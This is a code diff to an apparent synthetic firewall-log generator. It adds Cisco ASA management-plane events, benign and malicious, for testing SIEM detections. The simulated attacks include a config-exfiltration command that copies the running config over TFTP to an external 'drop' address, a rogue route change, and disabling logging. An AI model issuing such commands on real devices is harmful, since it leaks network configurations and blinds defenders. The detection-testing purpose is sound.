@@ -26,13 +26,14 @@ from datetime import datetime, timedelta, timezone
 from ipaddress import ip_network, AddressValueError
 
 try:
-    from modules import resolver
+    from modules import resolver, mgmt_plane
     from modules.session_utils import (get_random_user, find_user_by_ip, get_user_by_name,
         rand_ip_from_network, stable_vpn_ip, stable_mail_servers, weighted_destination,
         novel_country_vpn_ip, tor_vpn_ip, random_external_ip,
         rare_external_ip, rare_internal_host, impossible_travel_ips, stable_beacon_pairs)
 except ImportError:
     import resolver
+    import mgmt_plane
     from session_utils import (get_random_user, find_user_by_ip, get_user_by_name,
         rand_ip_from_network, stable_vpn_ip, stable_mail_servers, weighted_destination,
         novel_country_vpn_ip, tor_vpn_ip, random_external_ip)
@@ -148,9 +149,14 @@ _DEFAULT_THREAT_NAMES = [
     # still in _NON_ANALYTIC_EVENTS run only in long-running sessions (not on demand).
     "web_c2_beacon", "cryptomining", "rare_port_connection",
     "vpn_data_exfil", "vpn_concurrent_sessions", "external_fanout",
+    # Management plane (2026-10-19), from the gocortexio advisory corpus MANAGEMENT
+    # patterns. No shipped Cortex analytic covers device administration, so all five
+    # are in _NON_ANALYTIC_EVENTS: they exist for hunting / correlation rules.
+    "mgmt_admin_unexpected_source", "mgmt_config_route_change",
+    "mgmt_logging_suppressed", "mgmt_config_harvest", "snmp_unexpected_source",
 ]
 # Positional 1:1 with _DEFAULT_THREAT_NAMES — keep the two lists in step when editing.
-# Line groupings mirror the groupings in _DEFAULT_THREAT_NAMES above: 13 / 2 / 2 / 10 / 6.
+# Line groupings mirror the groupings in _DEFAULT_THREAT_NAMES above: 13 / 2 / 2 / 10 / 6 / 5.
 # This list carried 32 entries against 30 names until 2026-09-16, which would raise
 # "ValueError: The number of weights does not match the population" from
 # random.choices() on the fallback path (taken only when the config threat list is
@@ -160,7 +166,8 @@ _DEFAULT_THREAT_WEIGHTS = [15, 8, 10, 8, 4, 5, 3, 4, 3, 2, 1, 1, 1,
                            2, 2,
                            4, 4,
                            3, 4, 4, 3, 5, 3, 2, 3, 2, 3,
-                           2, 2, 2, 2, 2, 2]
+                           2, 2, 2, 2, 2, 2,
+                           1, 1, 1, 1, 1]
 
 # Events with no built-in XSIAM detection. They still run in long-running sessions (raw /
 # hunt / custom-rule use) but are not offered for on-demand firing. The "[Non-Analytic] "
@@ -229,6 +236,10 @@ _NON_ANALYTIC_EVENTS = {
     # summaries, not flow records — so nothing can satisfy "uploaded X to external
     # host Y over port 443". Volume-based analytics are UNREACHABLE for ASA.
     "vpn_data_exfil",
+    # Management plane: device administration has no Third-Party Firewall analytic.
+    # The messages parse (see mgmt_plane_probe.py) and serve hunts / correlation rules.
+    "mgmt_admin_unexpected_source", "mgmt_config_route_change",
+    "mgmt_logging_suppressed", "mgmt_config_harvest", "snmp_unexpected_source",
     # ldap_recon: LDAP enumeration is an XDR-agent detection ("Suspicious LDAP search
     # query executed"), not a Third-Party Firewall analytic — Firepower and Check Point
     # already classify it this way.
@@ -408,7 +419,7 @@ def _get_acl_name(config):
     return _get_asa_config(config).get('outside_in_acl', 'OUTSIDE_IN')
 
 
-def _generate_full_syslog_message(config, asa_message, event_time=None):
+def _generate_full_syslog_message(config, asa_message, event_time=None, hostname=None):
     """
     Wraps an ASA message with a syslog PRI header and device hostname.
 
@@ -421,8 +432,10 @@ def _generate_full_syslog_message(config, asa_message, event_time=None):
 
     event_time: optional datetime to embed instead of now (used by impossible travel
                 to place the two sessions at distinct points in time).
+    hostname:   optional peer-device name (multi-device management-plane patterns);
+                defaults to the configured hostname.
     """
-    hostname  = _get_asa_config(config).get('hostname', 'ASA-FW-01')
+    hostname  = hostname or _get_asa_config(config).get('hostname', 'ASA-FW-01')
     timestamp = _get_asa_timestamp(event_time)
 
     sev = 6  # informational default
@@ -2498,6 +2511,187 @@ def _simulate_dc_smb_outbound(config, session_context=None):
 
 # Main log generation entry point
 
+# Management plane
+#
+# Device administration: admin login (605005 / 605004), TACACS+ AAA (113004 / 113005 /
+# 113015), commands (111009 show, 111010 config, 111008 write memory) and logout
+# (611103). The shared mgmt_plane module supplies the operations team, its jump hosts,
+# the backup job and the SNMP poller, so the baseline is the same team on every vendor.
+# The Cisco ASA parser runs parse_cisco() over every message and the modeling rule maps
+# generalCiscoLog.user / .command / .src_ip — see _local_validation/mgmt_plane_probe.py
+# for what the tenant actually extracts from each of these IDs.
+
+def _asa_cmd_line(user, src_ip, command):
+    return mgmt_plane.cisco_cmd("ASA", user, src_ip, command)
+
+
+def _asa_admin_session(config, user, src_ip, commands, proto="ssh", iface=None,
+                       start=None, hostname=None, aaa_failures=0, gap=(2, 25),
+                       write_mem=False, logout=True):
+    """One admin CLI session (mgmt_plane.cisco_admin_session), framed as ASA syslog."""
+    asa_conf = _get_asa_config(config)
+    pairs = mgmt_plane.cisco_admin_session(
+        "ASA", user, src_ip, commands,
+        aaa_server=asa_conf.get('aaa_server', '10.0.1.10'),
+        mgmt_ip=asa_conf.get('management_ip', '10.0.30.1'),
+        outside_ip=asa_conf.get('outside_ip', '203.0.113.1'),
+        proto=proto, iface=iface, start=start, aaa_failures=aaa_failures, gap=gap,
+        write_mem=write_mem, logout=logout)
+    return [_generate_full_syslog_message(config, m, t, hostname) for t, m in pairs]
+
+
+_ASA_SHOW_COMMANDS = mgmt_plane.CISCO_SHOW_COMMANDS
+_ASA_ROUTINE_CHANGES = mgmt_plane.CISCO_ROUTINE_CHANGES
+
+
+def _simulate_mgmt_admin_session(config, session_context=None):
+    """BENIGN: a network admin from the NOC jump host checks status, and about one
+    session in five makes a routine change and saves it."""
+    user, src = mgmt_plane.admin_user(config), mgmt_plane.admin_source(config)
+    cmds = random.sample(_ASA_SHOW_COMMANDS, random.randint(2, 5))
+    change = random.random() < 0.2
+    if change:
+        n = random.randint(20, 240)
+        cmds += [c.format(n=n) for c in random.choice(_ASA_ROUTINE_CHANGES)]
+    return _asa_admin_session(config, user, src, cmds, write_mem=change)
+
+
+def _simulate_mgmt_config_backup(config, session_context=None):
+    """BENIGN: the scheduled config-backup job (svc_netbackup from the backup host)
+    reads the running config. This is the legitimate twin of config harvesting and
+    is what the harvesting pattern's caveat says will dominate results."""
+    host, acct = mgmt_plane.backup(config)
+    return _asa_admin_session(config, acct, host, ["show running-config"], gap=(1, 3))
+
+
+def _simulate_snmp_poll(config, session_context=None):
+    """BENIGN: the monitoring poller reads SNMP from infrastructure behind the ASA."""
+    poller = mgmt_plane.snmp_poller(config)
+    dev = random.choice(mgmt_plane.network_devices(config))
+    return _generate_connection_session(
+        config, "UDP", poller, dev, 161, None,
+        random.randint(80, 300), random.randint(200, 1500), 0,
+        src_interface="inside", dest_interface="inside")
+
+
+def _simulate_mgmt_admin_unexpected_source(config, session_context=None):
+    """THREAT device-admin-from-unexpected-source: a VALID admin account logs into the
+    ASA from outside the admin subnet — an external address on the outside interface
+    or an ordinary user workstation — after a couple of password guesses, then looks
+    around."""
+    src, kind = mgmt_plane.unexpected_source(config, session_context)
+    user = mgmt_plane.admin_user(config)
+    print(f"    - ASA Module simulating: admin login from unexpected source {src} ({kind})")
+    cmds = random.sample(_ASA_SHOW_COMMANDS, random.randint(3, 6))
+    return _asa_admin_session(config, user, src, cmds,
+                              iface="outside" if kind == "external" else "inside",
+                              aaa_failures=random.randint(0, 2))
+
+
+def _simulate_mgmt_config_route_change(config, session_context=None):
+    """THREAT network-device-config-or-route-change: traffic redirection. A new
+    default/static route via an attacker next hop, a permit-any ACE and a capture
+    tunnel, saved with write memory, outside any change window."""
+    src, kind = (mgmt_plane.unexpected_source(config, session_context)
+                 if random.random() < 0.6 else (mgmt_plane.admin_source(config), "admin-subnet"))
+    user = mgmt_plane.admin_user(config)
+    rogue = rare_external_ip()
+    print(f"    - ASA Module simulating: route/ACL change via {rogue} from {src} ({kind})")
+    cmds = mgmt_plane.cisco_route_change_commands(rogue)
+    return _asa_admin_session(config, user, src, cmds,
+                              iface="outside" if kind == "external" else None, write_mem=True)
+
+
+def _asa_logging_off_lines(config, user, src, start):
+    """Login + 'no logging enable'. The session stays open across the silence."""
+    return _asa_admin_session(config, user, src, ["show logging", "no logging enable"],
+                              start=start, gap=(3, 20), logout=False)
+
+
+def _asa_logging_on_lines(config, user, src, start):
+    t = start
+    lines = []
+    for msg in (_asa_cmd_line(user, src, "logging enable"),
+                f"%ASA-5-111008: User '{user}' executed the 'write memory' command.",
+                f"%ASA-5-611103: User logged out: Uname: {user}"):
+        lines.append(_generate_full_syslog_message(config, msg, t))
+        t += timedelta(seconds=random.randint(2, 8))
+    return lines
+
+
+_SUPPRESS_KEY = "cisco_asa"
+
+
+def _simulate_mgmt_logging_suppressed(config, session_context=None, backdate=False):
+    """THREAT network-device-logging-suppressed-for-a-window: 'no logging enable', a
+    window in which this ASA sends NOTHING (generate_log returns None), then
+    'logging enable' from the same session. The gap is the detection.
+
+    backdate=True (harness / on-demand outside the long-running worker) emits both
+    halves at once with the disable timestamped one window in the past, because no
+    later generate_log call will exist in that process to close the window."""
+    user = mgmt_plane.admin_user(config)
+    src, _ = (mgmt_plane.unexpected_source(config, session_context)
+              if random.random() < 0.5 else (mgmt_plane.admin_source(config), "admin-subnet"))
+    window = mgmt_plane.suppression_window_seconds()
+    now = datetime.now(timezone.utc)
+    print(f"    - ASA Module simulating: logging suppressed by {user} from {src} for {window}s")
+    if backdate:
+        return (_asa_logging_off_lines(config, user, src, now - timedelta(seconds=window + 60))
+                + _asa_logging_on_lines(config, user, src, now))
+    mgmt_plane.open_suppression(_SUPPRESS_KEY, window, user, src)
+    return _asa_logging_off_lines(config, user, src, now)
+
+
+_ASA_HARVEST_COMMANDS = mgmt_plane.CISCO_HARVEST_COMMANDS
+
+
+def _simulate_mgmt_config_harvest(config, session_context=None):
+    """THREAT scripted-device-config-harvesting: one source logs into several devices
+    of the estate with a VALID admin credential (no auth failures), each session a few
+    seconds long, the same config-dump commands each time, then copies the config off
+    the network. Not the backup job: different account, different host, multiple
+    devices, export to an outside address."""
+    src, kind = (mgmt_plane.unexpected_source(config, session_context)
+                 if random.random() < 0.5 else (random.choice(mgmt_plane.conf(config)["jump_hosts"]), "jump-host"))
+    user = mgmt_plane.admin_user(config)
+    drop = rare_external_ip()
+    devices = mgmt_plane.sibling_hostnames(_get_asa_config(config).get('hostname', 'ASA-FW-01'),
+                                           random.randint(3, 5))
+    print(f"    - ASA Module simulating: config harvest of {len(devices)} devices from {src} ({kind})")
+    t = datetime.now(timezone.utc) - timedelta(seconds=75 * len(devices))
+    out = []
+    for dev in devices:
+        cmds = list(_ASA_HARVEST_COMMANDS) + [
+            f"copy /noconfirm running-config tftp://{drop}/{dev.lower()}.cfg"]
+        out += _asa_admin_session(config, user, src, cmds, start=t, hostname=dev,
+                                  iface="outside" if kind == "external" else None, gap=(1, 2))
+        t += timedelta(seconds=random.randint(15, 60))
+    return out
+
+
+def _simulate_snmp_unexpected_source(config, session_context=None):
+    """THREAT snmp-from-unexpected-source: SNMP reads of the infrastructure from a host
+    that is not the monitoring poller — a user workstation walking every device."""
+    src = None
+    if session_context:
+        ui = get_random_user(session_context, preferred_device_type='workstation')
+        src = ui['ip'] if ui else None
+    src = src or "192.168.1.100"
+    user = _get_user_from_ip(config, src, session_context)
+    devs = mgmt_plane.network_devices(config)
+    print(f"    - ASA Module simulating: SNMP walk of {len(devs)} devices from {src}")
+    t = datetime.now(timezone.utc) - timedelta(seconds=4 * len(devs))
+    out = []
+    for dev in devs:
+        out += _generate_connection_session(
+            config, "UDP", src, dev, 161, user,
+            random.randint(60, 200), random.randint(800, 40000), random.randint(0, 3),
+            src_interface="inside", dest_interface="inside", event_time=t)
+        t += timedelta(seconds=random.randint(1, 4))
+    return out
+
+
 def generate_log(config, scenario=None, threat_level="Realistic",
                  benign_only=False, context=None, scenario_event=None):
     """
@@ -2586,6 +2780,10 @@ def generate_log(config, scenario=None, threat_level="Realistic",
         {"event": "rdp_internal_benign","weight": 3},
         {"event": "ftp_internal_benign","weight": 2},
         {"event": "ad_auth_benign",     "weight": 5},
+        # Management plane baseline: ~40 admin sessions and ~800 SNMP polls a day at
+        # one call per second. The backup job is clock-keyed (mgmt_plane.backup_due).
+        {"event": "mgmt_admin_session", "weight": 0.05},
+        {"event": "snmp_poll",          "weight": 1},
     ])
     benign_functions = [e['event'] for e in benign_events]
     benign_weights   = [e['weight'] for e in benign_events]
@@ -2597,6 +2795,18 @@ def generate_log(config, scenario=None, threat_level="Realistic",
     if not threat_functions:
         threat_functions = list(_DEFAULT_THREAT_NAMES)
         threat_weights   = list(_DEFAULT_THREAT_WEIGHTS)
+
+    if forced_choice is None:
+        # Logging suppressed: the device is silent until the window closes, then the
+        # same session turns logging back on (_simulate_mgmt_logging_suppressed).
+        _sup = mgmt_plane.suppression_state(_SUPPRESS_KEY)
+        if _sup == "active":
+            return None
+        if _sup:
+            return _asa_logging_on_lines(config, _sup["user"], _sup["src"],
+                                         datetime.now(timezone.utc))
+        if mgmt_plane.backup_due(_SUPPRESS_KEY):
+            return _simulate_mgmt_config_backup(config, session_context)
 
     if forced_choice is not None:
         # Named threat from dashboard — bypass random selection entirely
@@ -2658,6 +2868,10 @@ def generate_log(config, scenario=None, threat_level="Realistic",
         "dc_smb_outbound",           # picks DC from dc_servers config
         "vpn_data_exfil",            # resolves own VPN user/IP
         "vpn_concurrent_sessions",   # resolves own VPN user/IP
+        # management plane: sources come from mgmt_plane
+        "mgmt_admin_session", "mgmt_config_backup", "snmp_poll",
+        "mgmt_admin_unexpected_source", "mgmt_config_route_change",
+        "mgmt_logging_suppressed", "mgmt_config_harvest", "snmp_unexpected_source",
     }
     internal_host_ip = "192.168.1.100"
     if log_choice not in no_internal_ip_needed:
@@ -2917,5 +3131,31 @@ def generate_log(config, scenario=None, threat_level="Realistic",
 
     elif log_choice == "ad_auth_benign":
         _result = _generate_ldap_kerberos_benign(config, internal_host_ip, session_context)
+
+    # --- Management plane ---
+    elif log_choice == "mgmt_admin_session":
+        _result = _simulate_mgmt_admin_session(config, session_context)
+
+    elif log_choice == "mgmt_config_backup":
+        _result = _simulate_mgmt_config_backup(config, session_context)
+
+    elif log_choice == "snmp_poll":
+        _result = _simulate_snmp_poll(config, session_context)
+
+    elif log_choice == "mgmt_admin_unexpected_source":
+        _result = _simulate_mgmt_admin_unexpected_source(config, session_context)
+
+    elif log_choice == "mgmt_config_route_change":
+        _result = _simulate_mgmt_config_route_change(config, session_context)
+
+    elif log_choice == "mgmt_logging_suppressed":
+        _result = _simulate_mgmt_logging_suppressed(
+            config, session_context, backdate=bool((context or {}).get("mgmt_backdate")))
+
+    elif log_choice == "mgmt_config_harvest":
+        _result = _simulate_mgmt_config_harvest(config, session_context)
+
+    elif log_choice == "snmp_unexpected_source":
+        _result = _simulate_snmp_unexpected_source(config, session_context)
 
     return (_result, log_choice) if _result is not None else None
